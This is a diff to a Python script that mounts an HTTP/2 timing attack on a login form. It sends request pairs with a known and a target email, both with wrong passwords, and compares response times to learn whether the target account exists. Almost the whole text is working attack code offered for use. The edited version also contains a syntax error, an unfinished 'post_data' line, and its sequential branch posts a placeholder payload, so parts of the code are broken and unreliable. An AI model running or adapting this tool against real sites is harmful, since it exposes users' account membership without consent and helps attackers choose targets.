@@ -5,34 +5,73 @@ import string
 import os
 import sys
 
+import requests
+import time
+
+
+def measure_response_time(url, data=None):
+    start_time = time.time_ns()  # Start time in nanoseconds
+    response = requests.post(url, data=data)  # Send POST request
+    end_time = time.time_ns()    # End time in nanoseconds
+    elapsed_time_ns = end_time - start_time
+    elapsed_time = elapsed_time_ns / 1_000_000_000  # Convert to seconds
+    return elapsed_time, response.status_code
+
+def run_timing_attack(target_url, attempts=10, data=None):
+    times = []
+    for _ in range(attempts):
+        elapsed_time, status_code = measure_response_time(target_url, data=data)
+        print(f"Request took {elapsed_time:.6f} seconds, status code: {status_code}")
+        times.append(elapsed_time)
+    return times
 
 async def attack():
-    detail_file = open("results/" + sys.argv[4] + "_" + sys.argv[5] + "_detail.csv", "a")
-    winners_file = open("results/" + sys.argv[4] + "_" + sys.argv[5] + "_winners.csv", "a")
+    target_url = sys.argv[1]
+    known_account_email = sys.argv[2] # We know an account exists with this email (we don't need to know the password)
+    target_account_email = sys.argv[3] # We want to know if an account exists with this email
+    target_location = sys.argv[4] # "local" | "remote"
+    activity_type = sys.argv[5] # "attack" | "control"
+
+    detail_file = open("results/" + target_location + "_" + activity_type + "_detail.csv", "a")
+    winners_file = open("results/" + target_location + "_" + activity_type + "_winners.csv", "a")
 
     # This must be the email that you as the hacker want to test if exists on the site
-    if sys.argv[5] == "control":
+    if activity_type == "control":
         post_data = 'password=12345789abc&email=' + ''.join(random.choices(string.ascii_uppercase + string.digits, k=6)) + '@ephort.dk'
     else:
-        post_data = 'password=12345789abc&email=' + sys.argv[3]
-
+        post_data = 'password=12345789abc&email=' + 
 
     # This has to be the email known by the hacker to be existing on the site. But the password must be wrong.
-    post_data2 = 'password=12345789abc&email=' + sys.argv[2]
+    post_data2 = 'password=12345789abc&email=' + known_account_email
     
-    
-    r1 = H2Request('POST', sys.argv[1], {'content-length': str(len(post_data)),
-                                                     'Content-Type': 'application/x-www-form-urlencoded'}, post_data)
-    r2 = H2Request('POST', sys.argv[1], {'content-length': str(len(post_data2)),
-                                                     'Content-Type': 'application/x-www-form-urlencoded'}, post_data2)
+    r1 = H2Request(
+        'POST', 
+        target_url, 
+        {
+            'content-length': str(len(post_data)),
+            'Content-Type': 'application/x-www-form-urlencoded'
+        }, 
+        post_data
+    )
+
+    r2 = H2Request(
+        'POST', 
+        target_url, 
+        {
+            'content-length': str(len(post_data2)),
+            'Content-Type': 'application/x-www-form-urlencoded'
+        }, 
+        post_data2
+    )
     
     num_request_pairs = 5
     
     safety_margin = num_request_pairs / 5
     
     if (sys.argv[6] == "sequential"):
-        # for in in range(num_request_pairs):
-
+        for i in range(num_request_pairs):
+            payload = {"key": "value"}  # Replace with your POST data if needed
+            timings = run_timing_attack(target_url, data=payload)
     else:
         async with H2Time(r1, r2, num_request_pairs=num_request_pairs, num_padding_params=40, sequential=True, inter_request_time_ms=10, timeout=50) as h2t:
             results = await h2t.run_attack()
